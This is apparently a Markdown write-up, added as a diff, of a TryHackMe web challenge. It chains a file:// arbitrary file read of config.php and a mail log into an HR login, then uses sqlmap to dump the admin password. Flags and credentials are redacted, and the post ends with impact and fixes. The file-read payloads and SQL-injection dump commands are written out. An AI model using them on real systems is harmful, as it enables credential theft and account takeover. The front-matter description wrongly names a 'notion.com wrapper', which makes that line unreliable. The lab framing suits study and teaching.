@@ -1,0 +1,185 @@
+---
+title: 'Recruit Challenge'
+description: "A file.php 'view CV' endpoint is an arbitrary file read via the https://app.notion.com wrapper; it leaks a mail log that points at hardcoded HR credentials in config.php, and once logged in a SQL-injectable candidate search dumps the admin password for the admin flag."
+date: 2026-05-26
+platform: tryhackme
+room: 'Recruit Challenge'
+roomUrl: 'https://tryhackme.com/room/recruitwebchallenge'
+difficulty: medium
+tags:
+  - 'web'
+  - 'sql-injection'
+  - 'lfi'
+  - 'php'
+  - 'linux'
+vulnClasses:
+  - 'arbitrary file read'
+  - 'hardcoded credentials'
+  - 'sql injection'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Recruit Challenge — Arbitrary File Read to Leaked Config to SQLi Admin Takeover**
+
+_A walkthrough of the "Recruit" web challenge from TryHackMe. A recruitment portal exposes a "view CV" endpoint that reads any file we name through PHP's_ _`file://`_ _wrapper. We use it to read an internal mail log, which tells us HR credentials are sitting in_ _`config.php`\*\*; we read that file's source, log in as HR, and then abuse a SQL-injectable candidate search to dump the admin password and claim the admin flag._
+
+> The flag and all credentials are redacted. Recruit is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. Values shown as `<redacted>` or `THM{<redacted>}` are real on the box but withheld here.
+
+---
+
+### **TL;DR — the whole chain**
+
+<Callout type="tldr">
+
+`gobuster`/`nikto` flag `file.php`, a readable-but-empty `config.php`, and a directory-listed `/mail/` → `file.php?cv=file:///var/www/html/mail/mail.log` reads an internal email (**arbitrary file read** via the `file://` wrapper) that says _HR credentials live in_ _`config.php`\*\*, admin credentials live in the database_ → `file.php?cv=file:///var/www/html/config.php` returns the PHP **source** (the wrapper reads, it doesn't execute) exposing a **hardcoded** **`$HR_PASSWORD`** → log in as `hr` → the candidate search on `dashboard.php?search=` is **SQL-injectable** → `sqlmap` dumps `recruit_db.users` → the **admin password** → log in as `admin` → the dashboard prints the **admin flag**.
+
+One file-read bug finds the creds; one injection finishes the job.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+```
+
+`nmap -sC -sV` shows SSH, a DNS server, and an Apache "Recruit" web app:
+
+```text
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  |_http-title: Recruit
+```
+
+Content discovery maps the app and surfaces the two files that matter:
+
+```text
+gobuster dir -u http://$IP/ -w .../big.txt -x php,txt,js,bak,html
+# /api.php        (200)
+# /config.php     (200) [Size: 0]      <- empty when executed...
+# /file.php       (200) [Size: 20]     <- a file viewer?
+# /dashboard.php  (302 -> index.php)
+# /phpmyadmin     (301)
+# /mail           (301)                <- directory indexing (nikto flags it)
+# /sitemap.xml    (200)
+```
+
+`nikto` adds the hints out loud: _"config.php: PHP Config file may contain database IDs and passwords"_ and _"/mail/: Directory indexing found."_ `config.php` returns **0 bytes** in a browser because PHP executes it — but that only hides the source from normal requests, not from a file-read primitive.
+
+### **The vulnerability —** **`file.php`** **reads any file we name**
+
+`file.php` takes a `cv` parameter (a recruitment portal "view this candidate's CV") and hands it straight to a file read. Supplying a `file://` URL makes it return the **raw bytes** of any path — including PHP source, which is never executed on this path:
+
+<Callout type="insight">
+
+The `file://` wrapper is the whole trick. A normal request to `config.php` runs the PHP and returns an empty page, so the secrets look safe. But `file.php?cv=file:///var/www/html/config.php` **reads the file as data**, never executing it — so the hardcoded password that was "hidden" behind PHP execution comes back in plaintext. An arbitrary file read turns "empty config" into "here are the credentials."
+
+</Callout>
+
+### **Step 1 — read the mail log for a lead**
+
+`/mail/` is directory-listed, and the file-read primitive lets us pull the server-side mail log:
+
+```text
+http://$IP/file.php?cv=file:///var/www/html/mail/mail.log
+```
+
+Inside is a deployment-confirmation email from HR to IT that spells out exactly where the secrets are:
+
+```text
+From: HR Team <hr@recruit.thm>
+To: IT Support <it-support@recruit.thm>
+Subject: Recruitment Portal Deployment Confirmation
+
+- HR login credentials (username: hr) are currently stored in the application
+  configuration file (config.php) ...
+- Administrator credentials are NOT stored in the application files and are
+  securely maintained within the backend database.
+```
+
+That is the roadmap: **HR creds are in** **`config.php`\*\***; admin creds are in the DB.\*\*
+
+### **Step 2 — read config.php source, recover the HR password**
+
+Point the same primitive at `config.php` via `file://` to read its source instead of executing it:
+
+```text
+http://$IP/file.php?cv=file:///var/www/html/config.php
+# $APP_NAME    = 'Recruit';
+# ...
+# /* HR Credentials (Temporary - Initial Rollout Phase) */
+# $HR_PASSWORD = '<redacted>';
+```
+
+The config even admits the creds are there "temporarily for ease of access." We now have `hr` / `<redacted>` — and logging in on the home page lands us on `dashboard.php`.
+
+### **Step 3 — SQL injection in the candidate search**
+
+The HR dashboard has a candidate search. The smallest possible probe — a single `#` — throws a SQL error, a strong tell that `search` is injectable:
+
+```text
+GET /dashboard.php?search=asd
+```
+
+Save that authenticated request and let `sqlmap` do the rest:
+
+```text
+sqlmap -r request.txt --dbs
+# available databases: information_schema, mysql, performance_schema,
+#                      phpmyadmin, recruit_db, sys
+
+sqlmap -r request.txt -D recruit_db -T users -C password,username --dump
+# +----------------+----------+
+# | password       | username |
+# +----------------+----------+
+# | <redacted>     | admin    |
+# +----------------+----------+
+```
+
+The `users` table holds the one credential the email promised was "securely maintained in the database": the **admin** account, password in plaintext.
+
+### **Step 4 — admin login, grab the flag**
+
+Log in as `admin` with the dumped password. The admin view of the dashboard prints the flag outright:
+
+```text
+http://$IP/dashboard.php
+# Candidate Applications
+# ADMIN Flag:  THM{<redacted>}
+```
+
+File-read → mail log → config source → HR login → SQLi → admin password → admin flag.
+
+### **Impact**
+
+<Callout type="critical">
+
+**High — CVSS 3.1 8.6** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`). The two bugs reinforce each other:
+
+- **Arbitrary file read** (`file.php` + `file://`) discloses any server file — source code, configs, logs — and defeats the "PHP executes so the source is hidden" assumption, leaking a hardcoded credential.
+- **SQL injection** on an authenticated search allows full database exfiltration, including the administrator's plaintext password — i.e. complete account takeover of the application.
+
+Chained, an unauthenticated visitor reads config, becomes HR, and then becomes admin.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Never build a file path from user input.** In `file.php`, map an allow-list of CV identifiers to known files, reject wrappers (`file://`, `php://`) and absolute/`../` paths, and keep uploads outside the web root.
+2. **Don't store credentials in source or config.** Use a secrets manager or environment variables with least privilege; the "temporary for rollout" password is a permanent liability.
+3. **Parameterize every query.** The search must use prepared statements/bound parameters; never concatenate request input into SQL.
+4. **Hash passwords** (bcrypt/argon2). The DB stored the admin password in plaintext, turning one injection into instant takeover. Also disable directory indexing on `/mail/`.
+
+</Callout>
+
+### **Takeaways**
+
+- **"The source isn't served" is not protection.** A `file://` read returns bytes without executing PHP — an empty `config.php` in the browser is still fully readable through a file-read bug.
+- **Read the logs the app leaves lying around.** The mail log handed us the exact location of every credential before we touched the database.
+- **One injectable parameter = the whole database.** `sqlmap` turns a single error-throwing field into a full dump, admin password included.
+- **Plaintext passwords make it trivial.** Hashing would have forced a cracking step; here the dump _was_ the login.
+
+Thanks for reading. Recruit is a compact reminder that a single arbitrary-file-read, plus credentials left where they shouldn't be, is enough to walk an app from anonymous to administrator.
